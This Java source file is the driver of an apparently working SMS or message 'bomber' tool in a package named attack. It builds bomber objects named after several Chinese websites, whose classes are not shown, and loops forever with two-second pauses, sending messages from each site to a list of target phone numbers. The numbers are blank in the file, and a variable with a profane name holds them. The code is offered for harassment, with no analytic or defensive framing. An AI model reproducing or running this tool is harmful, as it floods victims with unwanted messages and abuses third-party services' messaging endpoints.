package com.utils.attack;

import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by fz on 2015/8/23.
 */
public class BomberCommandCenter {

    public static void main(String[] args) throws Exception {

        CloseableHttpClient httpClient = HttpClients.createDefault();

        // 轰炸机准备
        List<MessageBomber> myBomberes = new ArrayList<MessageBomber>();
        MessageBomber iPingAnBomber = new IPingAnBomber("平安轰炸机");
        MessageBomber maoPuBomber = new MaoPuBomber("猫扑轰炸机");
        MessageBomber ruiLiBomber = new RuiLiBomber("瑞丽轰炸机");
        MessageBomber meiPaiBomber = new MeiPaiBomber("美拍轰炸机");
        MessageBomber zhongHuaYingCaiBomber = new ZhongHuaYingCaiBomber("中华英才轰炸机");
        myBomberes.add(iPingAnBomber);
        myBomberes.add(maoPuBomber);
        myBomberes.add(ruiLiBomber);
        myBomberes.add(meiPaiBomber);
        myBomberes.add(zhongHuaYingCaiBomber);

        // 轰炸目标
        List<String> fuckNos = new ArrayList<String>();
        fuckNos.add("");
        fuckNos.add("");

        int count = 1;
        // Attack
        while(true){

            for(int i=0; i<fuckNos.size(); i++){
                String fuckNo = fuckNos.get(i);
                for(int j=0; j<myBomberes.size(); j++){
                    try {
                        MessageBomber messageBomber = myBomberes.get(j);
                        String result = messageBomber.emissionMissile(httpClient, fuckNo);
                        System.out.println(messageBomber.getBomberName());
                        System.out.println(result);
                        System.out.println("==**"+fuckNo+"_"+(count++)+"**==");
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                    Thread.sleep(2000);
                }
            }

            // Reload Bullet
            Thread.sleep(2000);
        }

    }
}
